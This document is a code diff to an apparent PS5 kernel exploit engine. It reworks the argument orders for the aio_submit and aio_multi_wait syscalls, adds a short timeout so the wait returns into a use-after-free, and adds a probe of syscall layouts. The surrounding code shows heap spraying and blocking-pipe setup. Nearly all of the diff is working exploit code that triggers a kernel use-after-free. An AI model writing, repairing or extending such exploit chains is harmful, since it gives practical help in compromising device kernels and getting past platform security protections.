@@ -227,24 +227,38 @@ export function makeBagagwaEngine(X) {
         if (!reqPtrBuf) return { ok: false, why: "aio req-ptr buffer OOM (arena exhausted)" };
         w64(reqPtrBuf.u8, 0, reqBuf.base);
 
-        // Try (ptr_array, count) — correct PS5 SDK convention
-        let r = await sys(SYS_AIO_SUBMIT, reqPtrBuf.base, 1);
-        note("[SUBMIT-" + idx + "] ptr-arr ret=" + r.s32 + " err=" + r.errText);
-        if (r.failed) {
-            // Fallback: (count, ptr_array) — swapped order
-            note("[SUBMIT-" + idx + "] retry (count, ptr_arr)");
+        // Upstream v12/HEAD: (count, ptr) first — (ptr, count) OOMs
+        // because a pointer in the count slot means a huge kernel alloc.
+        // Each attempt try/caught so a hung layout falls through.
+        let r = null;
+        try {
             r = await sys(SYS_AIO_SUBMIT, 1, reqPtrBuf.base);
-            note("[SUBMIT-" + idx + "] swapped ret=" + r.s32 + " err=" + r.errText);
+            note("[SUBMIT-" + idx + "] (count, ptr_arr) ret=" + r.s32 + " err=" + r.errText);
+        } catch (e) {
+            note("[SUBMIT-" + idx + "] (count, ptr_arr) threw: " + (e && e.message ? e.message : e));
         }
-        if (r.failed) {
+        if (!r || r.failed) {
+            try {
+                note("[SUBMIT-" + idx + "] retry (ptr_arr, count)");
+                r = await sys(SYS_AIO_SUBMIT, reqPtrBuf.base, 1);
+                note("[SUBMIT-" + idx + "] ptr-arr ret=" + r.s32 + " err=" + r.errText);
+            } catch (e) {
+                note("[SUBMIT-" + idx + "] (ptr_arr, count) threw: " + (e && e.message ? e.message : e));
+            }
+        }
+        if (!r || r.failed) {
             // Last resort: original direct struct ptr (pre-13.x path)
-            note("[SUBMIT-" + idx + "] retry (count, direct_struct)");
-            r = await sys(SYS_AIO_SUBMIT, 1, reqBuf.base);
-            note("[SUBMIT-" + idx + "] direct ret=" + r.s32 + " err=" + r.errText);
+            try {
+                note("[SUBMIT-" + idx + "] retry (count, direct_struct)");
+                r = await sys(SYS_AIO_SUBMIT, 1, reqBuf.base);
+                note("[SUBMIT-" + idx + "] direct ret=" + r.s32 + " err=" + r.errText);
+            } catch (e) {
+                note("[SUBMIT-" + idx + "] direct threw: " + (e && e.message ? e.message : e));
+            }
         }
         // ── END FIX ────────────────────────────────────────────────────────────
 
-        if (r.failed) return { ok: false, why: "aio_submit: " + r.errText };
+        if (!r || r.failed) return { ok: false, why: "aio_submit: " + (r ? r.errText : "all layouts hung") };
         S.aioRequests.push({ id: r.s32, buf: reqBuf });
         return { ok: true, reqId: r.s32 };
     }
@@ -261,10 +275,18 @@ export function makeBagagwaEngine(X) {
             note("[UAF] slot " + i + " reqId=" + S.aioRequests[i].id);
         }
 
-        note("[UAF] aio_multi_wait(ids," + num + ",timeout=0,mode=0)");
+        // Upstream 5a1f212: PS5 aio_multi_wait = (ids, num, timeout_ptr, mode).
+        // timeout=NULL(0) = wait forever -> with pending reads on an empty
+        // pipe it blocks indefinitely -> worker never returns -> system OOM.
+        // Pass a 100ns timespec so it returns via timeout -> cleanup -> UAF.
+        const tsBuf = safeAlloc(16, "aio-mw-timeout");
+        if (!tsBuf) return { ok: false, why: "multi-wait timeout buffer OOM (arena exhausted)" };
+        w64(tsBuf.u8, 0, i64(0, 0));
+        w64(tsBuf.u8, 8, i64(100, 0));
+        note("[UAF] aio_multi_wait(ids," + num + ",timeout=100ns,mode=0)");
         note("[UAF] writeup sec.2: PS4=3args, PS5 adds mode → 4 args");
         const r = await sys(SYS_AIO_MULTI_WAIT,
-            reqIdBuf.base, num, 0, AIO_MULTI_WAIT_MODE_0);
+            reqIdBuf.base, num, tsBuf.base, AIO_MULTI_WAIT_MODE_0);
         note("[UAF] ret=" + r.s32 + " err=" + r.errText +
             " hex=" + r.hex);
 
@@ -273,6 +295,35 @@ export function makeBagagwaEngine(X) {
             S.uafRequestIdx = 0;
         }
         return { ok: !r.failed, ret: r.s32 };
+    }
+
+    // Upstream v10-style safe layout probe (dummy data only, never fails
+    // the stage): EPERM/EINVAL/ESRCH = reachable layout, ENOMEM = pointer
+    // in count slot (huge alloc), hang = blocking layout. The errno map
+    // tells us the true 13.60 signature empirically.
+    async function probeAioLayouts() {
+        note("[PROBE] arg-layout probe (dummy data, safe)...");
+        const zs = safeAlloc(0x40, "probe-zero-struct");
+        const ids = safeAlloc(8, "probe-dummy-ids");
+        if (!zs || !ids) { note("[PROBE] skipped (OOM)"); return; }
+        for (let i = 0; i < 0x40; i++) zs.u8[i] = 0;
+        w32(ids.u8, 0, 0); w32(ids.u8, 4, 1);
+        const cases = [
+            ["submit(1,ptr)", SYS_AIO_SUBMIT, [1, zs.base]],
+            ["submit(ptr,1)", SYS_AIO_SUBMIT, [zs.base, 1]],
+            ["wait(ids,2,0,0)", SYS_AIO_MULTI_WAIT, [ids.base, 2, 0, 0]],
+            ["wait(0,ids,2,0)", SYS_AIO_MULTI_WAIT, [0, ids.base, 2, 0]],
+        ];
+        for (const [label, num, args] of cases) {
+            if (P.syscalls[num] === undefined) { note("[PROBE] " + label + ": no stub"); continue; }
+            try {
+                const r = await sys.apply(null, [num].concat(args));
+                note("[PROBE] " + label + " -> ret=" + r.s32 + " err=" + r.errText);
+            } catch (e) {
+                note("[PROBE] " + label + " threw: " + (e && e.message ? e.message : e));
+            }
+        }
+        note("[PROBE] done — EPERM/EINVAL=safe layout, ENOMEM=pointer-as-count, hang=blocking");
     }
 
     async function sprayOsem(count, batchSize) {
@@ -706,6 +757,7 @@ export function makeBagagwaEngine(X) {
         }
         // ── END AIO INIT ─────────────────────────────────────────────────────────
 
+        try { await probeAioLayouts(); } catch (_) {}
         note("[S0-1] pipe (empty — reads must block)");
         const pipeBuf = safeAlloc(8, "uaf-pipe");
         if (!pipeBuf) { out.why = "uaf-pipe buffer OOM (arena exhausted)"; return out; }
